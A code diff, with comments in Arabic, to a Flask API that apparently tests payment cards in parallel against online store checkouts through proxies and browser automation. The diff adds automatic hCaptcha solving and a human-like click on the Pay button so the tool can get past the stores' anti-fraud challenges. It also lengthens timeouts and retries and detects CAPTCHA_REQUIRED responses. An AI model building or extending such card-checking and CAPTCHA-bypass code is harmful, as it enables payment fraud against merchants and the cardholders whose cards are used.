@@ -1,4 +1,4 @@
-# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة المتوازية
+# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة المتوازية + حل كابتشا تلقائي
 import time
 import re
 import json
@@ -18,13 +18,13 @@ import queue
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
 import random
-from user_agent import *
-usser=generate_user_agent()
+from hcaptcha_challenger import solve_hcaptcha
+
 app = Flask(__name__)
 
 # ==================== إعدادات الأداء ====================
 MAX_WORKERS = 10  # عدد الطلبات المتوازية اللي تشتغل بنفس الوقت
-REQUEST_TIMEOUT = 60
+REQUEST_TIMEOUT = 120  # زودنا الوقت لان حل الكابتشا ياخذ وقت
 TASK_QUEUE = queue.Queue()
 
 # منفذ العمليات المتوازية - هذا اللي يخلي الطلبات تشتغل بنفس الوقت
@@ -210,6 +210,87 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
     
     return None, None
 
+def attempt_solve_captcha_and_retry(driver, task_id=None):
+    """
+    محاولة حل الكابتشا وإعادة الضغط على زر الدفع
+    ترجع True إذا تم الحل بنجاح وتم الضغط على الدفع
+    """
+    try:
+        logger.info(f"[{task_id}] CAPTCHA detected! Attempting to solve...")
+        
+        # 1. حل الكابتشا باستخدام المكتبة
+        captcha_solved = solve_hcaptcha(driver)
+        
+        if not captcha_solved:
+            logger.warning(f"[{task_id}] Failed to solve captcha automatically")
+            return False
+        
+        logger.info(f"[{task_id}] Captcha solved successfully!")
+        time.sleep(2)  # انتظار بعد الحل
+        
+        # 2. البحث عن زر الدفع مرة ثانية والضغط عليه
+        driver.switch_to.default_content()
+        time.sleep(1)
+        
+        pay_selectors = [
+            "//button[contains(text(), 'Pay now')]",
+            "//button[contains(text(), 'Pay') and not(contains(text(), 'Pal'))]",
+            "//button[contains(text(), 'Complete order')]",
+            "//button[contains(text(), 'Place order')]",
+            "//button[@type='submit']"
+        ]
+        
+        pay_button = None
+        for xpath in pay_selectors:
+            try:
+                buttons = driver.find_elements(By.XPATH, xpath)
+                for button in buttons:
+                    if button.is_displayed() and button.is_enabled():
+                        pay_button = button
+                        break
+                if pay_button:
+                    break
+            except:
+                continue
+        
+        if pay_button:
+            # استخدام ActionChains لنقر بشري
+            try:
+                actions = ActionChains(driver)
+                actions.move_to_element(pay_button)
+                actions.pause(random.uniform(0.3, 0.8))
+                actions.click()
+                actions.perform()
+                logger.info(f"[{task_id}] Pay button clicked after captcha solve")
+            except:
+                driver.execute_script("arguments[0].click();", pay_button)
+                logger.info(f"[{task_id}] Pay button clicked via JS after captcha solve")
+            
+            return True
+        else:
+            # محاولة أخيرة - أي زر submit
+            try:
+                driver.execute_script("""
+                    var buttons = document.querySelectorAll('button[type="submit"], input[type="submit"]');
+                    for (var i = 0; i < buttons.length; i++) {
+                        var text = (buttons[i].textContent || buttons[i].value || '').toLowerCase();
+                        if (text.includes('pay') || text.includes('complete') || text.includes('place') || text.includes('order')) {
+                            buttons[i].click();
+                            return true;
+                        }
+                    }
+                    return false;
+                """)
+                logger.info(f"[{task_id}] Fallback submit button clicked after captcha solve")
+                return True
+            except:
+                logger.error(f"[{task_id}] Could not find pay button after captcha solve")
+                return False
+        
+    except Exception as e:
+        logger.error(f"[{task_id}] Error during captcha solve attempt: {str(e)}")
+        return False
+
 def ff(ccx, site, task_id=None):
     """
     دالة معالجة بطاقة واحدة وموقع واحد
@@ -250,6 +331,7 @@ def ff(ccx, site, task_id=None):
     final_url = None
     order_number = None
     payment_status = None
+    captcha_retry_done = False  # متغير لتتبع إذا حاولنا حل الكابتشا
     
     # ==================== 1. جلب رابط الدفع ====================
     try:
@@ -259,7 +341,7 @@ def ff(ccx, site, task_id=None):
         proxies = {"http": proxy_url, "https": proxy_url}
         
         s = requests.Session()
-        s.headers.update({'User-Agent':usser})
+        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'})
         
         digital_keywords = [
             'worry-free', 'protection', 'insurance', 'warranty', 'digital', 
@@ -689,7 +771,7 @@ def ff(ccx, site, task_id=None):
              
             ]
             
-            for attempt in range(10):
+            for attempt in range(12):  # زودنا عدد المحاولات عشان نلحق نمسك CAPTCHA_REQUIRED
                 time.sleep(1.5)
                 
                 poll_responses = driver.execute_script("return window.pollForReceiptResponses || [];")
@@ -699,6 +781,7 @@ def ff(ccx, site, task_id=None):
                 
                 page_urls = driver.execute_script("return window.pageUrls || [];")
                 
+                # فحص إذا وصلنا لصفحة thank_you
                 if '/thank_you' in current_url:
                     order_confirmed = True
                     found_code = 'ORDER_CONFIRMED'
@@ -741,12 +824,30 @@ def ff(ccx, site, task_id=None):
                 except:
                     pass
                 
+                # تجميع الكودات من الردود
                 for resp in poll_responses:
                     body = resp.get('body', '')
                     url = resp.get('url', '')
                     
                     if not body:
                         continue
+                    
+                    # ============ فحص CAPTCHA_REQUIRED ============
+                    if 'CAPTCHA_REQUIRED' in body and not captcha_retry_done:
+                        logger.info(f"[{task_id}] CAPTCHA_REQUIRED detected in response!")
+                        captcha_retry_done = True
+                        
+                        # محاولة حل الكابتشا
+                        captcha_result = attempt_solve_captcha_and_retry(driver, task_id)
+                        
+                        if captcha_result:
+                            logger.info(f"[{task_id}] Captcha solved, waiting for new responses...")
+                            time.sleep(3)  # انتظار الرد الجديد
+                            continue  # متابعة الحلقة للحصول على رد جديد
+                        else:
+                            logger.warning(f"[{task_id}] Captcha solve failed, continuing with CAPTCHA_REQUIRED code")
+                            found_code = 'CAPTCHA_REQUIRED'
+                            break
                     
                     pattern = r'"code"\s*:\s*"([^"]+)"'
                     matches = re.findall(pattern, body, re.IGNORECASE)
@@ -816,12 +917,29 @@ def ff(ccx, site, task_id=None):
                         except:
                             pass
                 
+                # فحص CAPTCHA_REQUIRED في graphql_responses أيضاً
                 for resp in graphql_responses:
                     body = resp.get('body', '')
-                    url = resp.get('url', '')
                     
                     if not body:
                         continue
+                    
+                    if 'CAPTCHA_REQUIRED' in body and not captcha_retry_done:
+                        logger.info(f"[{task_id}] CAPTCHA_REQUIRED detected in graphql response!")
+                        captcha_retry_done = True
+                        
+                        captcha_result = attempt_solve_captcha_and_retry(driver, task_id)
+                        
+                        if captcha_result:
+                            logger.info(f"[{task_id}] Captcha solved, waiting for new responses...")
+                            time.sleep(3)
+                            continue
+                        else:
+                            logger.warning(f"[{task_id}] Captcha solve failed")
+                            found_code = 'CAPTCHA_REQUIRED'
+                            break
+                    
+                    url = resp.get('url', '')
                     
                     if '/thank_you' in body or 'thank_you' in url:
                         order_confirmed = True
@@ -941,6 +1059,14 @@ def ff(ccx, site, task_id=None):
                                         response = driver.execute_cdp_cmd('Network.getResponseBody', {'requestId': request_id})
                                         body = response.get('body', '')
                                         if body:
+                                            if 'CAPTCHA_REQUIRED' in body and not captcha_retry_done:
+                                                logger.info(f"[{task_id}] CAPTCHA_REQUIRED detected in performance logs!")
+                                                captcha_retry_done = True
+                                                captcha_result = attempt_solve_captcha_and_retry(driver, task_id)
+                                                if captcha_result:
+                                                    time.sleep(3)
+                                                    continue
+                                            
                                             if 'CompletePaymentChallenge' in body:
                                                 try:
                                                     data = json.loads(body)
@@ -1002,6 +1128,9 @@ def ff(ccx, site, task_id=None):
                 result_typename = found_typename or 'CompletePaymentChallenge'
             elif found_code == 'SUCCESS':
                 result_code = 'SUCCESS'
+                result_typename = found_typename
+            elif found_code == 'CAPTCHA_REQUIRED':
+                result_code = 'CAPTCHA_REQUIRED'
                 result_typename = found_typename
             elif found_code and found_code not in excluded_codes:
                 result_code = found_code
